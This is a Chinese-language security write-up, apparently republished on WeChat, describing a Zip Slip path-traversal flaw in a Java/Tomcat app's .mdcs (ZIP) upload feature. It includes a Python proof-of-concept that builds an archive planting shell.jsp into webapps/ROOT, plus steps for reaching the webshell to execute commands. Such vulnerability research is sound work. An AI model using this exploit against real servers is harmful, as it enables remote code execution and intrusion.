---
title: 0113.Java 应用程序中的 ZIP 滑移导致远程命令执行
url: https://mp.weixin.qq.com/s/xY5WyLnusFNipKEglJdKww
source: Doonsec's feed
date: 2026-01-06
fetch_date: 2026-01-07T03:27:33.602085
---

# 0113.Java 应用程序中的 ZIP 滑移导致远程命令执行

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/yKTOKd3ibs99XkJAGOYcDMaiacibPxrWrK5KFzYLz7bcabfN2jnBQseCO4t9ShU34M4ibiaLaUx4ejvoMGUuWicHr72A/0?wx_fmt=jpeg)

# 0113.Java 应用程序中的 ZIP 滑移导致远程命令执行

原创

Abdelnour Osman

Rsec

![]()

在小说阅读器中沉浸阅读

本文章仅用网络安全研究学习，请勿使用相关技术进行违法犯罪活动。

声明：本文搬运自互联网，如你是原作者，请联系我们！

类型：ZIP目录遍历

在对基于 Java 的 Web 应用程序进行灰盒安全评估时，我发现了一个允许用户导出和导入应用程序模型的功能。该功能支持下载和上传扩展名为“.mdcs”的模型文件。在分析此功能时，我重点关注了应用程序如何处理上传的文件，因为对归档或序列化数据格式处理不当通常会带来安全风险。

## 分析

##

在测试应用程序时，我们发现该应用程序接受扩展名为 **.mdcs 的**文件上传，这些文件本质上是 **ZIP 压缩包**。应用程序在处理这些文件之前会执行基本的扩展名检查。

*PS：本报告中引用的代码片段仅用于模拟目的，并不代表实际的生产源代码。*

![](https://mmbiz.qpic.cn/mmbiz_jpg/yKTOKd3ibs99XkJAGOYcDMaiacibPxrWrK5bJlwXllbZicDxawwiadh4vD5z4f6OEqib3ic8raHnichW7ibgz0TTAdRZ03w/640?wx_fmt=other&from=appmsg)

文件扩展名检查

验证通过后，应用程序会在 Tomcat 的临时目录下创建一个临时目录，将 **mdcs** （ZIP）文件的内容解压到该目录中，然后尝试从解压后的数据中读取特定文件（metadata.json）。处理完成后，该临时目录将被删除。

![](https://mmbiz.qpic.cn/mmbiz_jpg/yKTOKd3ibs99XkJAGOYcDMaiacibPxrWrK5KyvBiaSIby6JBmjCfl5DCX1kOHXT2C6Ej0icCBgF75CckXDdDDMLPYicA/640?wx_fmt=other&from=appmsg)

将模型文件解压到临时目录

乍一看，这种设计似乎很安全，因为临时目录位于 Tomcat webapps 目录之外，这意味着任意上传的文件无法通过 Web 服务器直接访问。然而，这种假设存在缺陷，因为存在众所周知的 **ZIP 滑移漏洞**。

## 开发

在默认的 Tomcat 安装中，临时目录遵循以下结构：

```
C:\tomcat\temp\mdcs_<random_string>\
```

该应用程序使用 ZipInputStream（或类似 API）提取文件，但并未正确验证压缩包内的文件路径。这使得精心构造的 ZIP 文件可以包含路径遍历序列（例如，../../）的条目。攻击者可以利用此漏洞，使应用程序将文件提取到预期临时目录之外。

例如，通过将恶意 JSP 文件（shell.jsp）嵌入到 ZIP 存档中，并将该条目命名为：

```
../../webapps/ROOT/shell.jsp
```

该文件将被解压到已部署的 Tomcat 应用程序目录中。一旦上传并处理完毕，攻击者即可通过 Web 服务器访问 JSP 文件，从而有效地实现**远程代码执行 (RCE)** 。

## 概念验证（PoC）

下面这个简单的 Python 脚本会生成一个包含恶意载荷的 ZIP 文件：

```
import zipfileimport os
def create_zip(payload_path, output_zip):    with zipfile.ZipFile(output_zip, 'w') as zipf:        with open(payload_path, 'rb') as f:            payload = f.read()
        zi = zipfile.ZipInfo("../../webapps/ROOT/shell.jsp")        zipf.writestr(zi, payload)
if __name__ == "__main__":    create_zip("shell.jsp", "exploit.mdcs")    print("[+] Malicious MDCS created: exploit.mdcs")
```

### 利用流程

* 攻击者使用上述脚本生成恶意模型文件 **MDCS** (ZIP)。
* 将 MDCS 文件上传到应用程序。
* 存在漏洞的提取逻辑会将“ ***shell.jsp*** ”放置到“ ***webapps/ROOT/*** *”* 或“ ***webapps/app-name/*** ”中。
* 攻击者访问 http://target/shell.jsp 或 http://target/app-name/shell.jsp 以执行任意命令。

这将导致目标服务器上的远程代码完全执行（RCE）。

![](https://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs99XkJAGOYcDMaiacibPxrWrK5icFUMQE2Jpl9iadNrEr7NoQznaP857ic4ynIicXwOxxzic4QcVkJ4RlSs5g/640?wx_fmt=png&from=appmsg)

利用结果

##

## 结论

已发现的漏洞表明，文件提取过程中验证不足会导致严重的安全风险。攻击者利用 **.mdcs** 文件上传功能发起的 ZIP 滑移攻击，可以遍历目录并将任意文件放置到 Tomcat 环境中的敏感位置。这最终导致恶意 JSP 文件执行，从而实现完全**远程代码执行 (RCE)** 。

感谢您耐心读到这里。

预览时标签不可点

阅读原文

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs98K2tqBAticMskicyUAjtQoicZSdgKiaj1G5KGKOyd7A6paRrrHhz2JVvU3RLRsboI6MibP7Nl68yVAyTw/0?wx_fmt=png)

Rsec

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/yKTOKd3ibs98K2tqBAticMskicyUAjtQoicZSdgKiaj1G5KGKOyd7A6paRrrHhz2JVvU3RLRsboI6MibP7Nl68yVAyTw/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过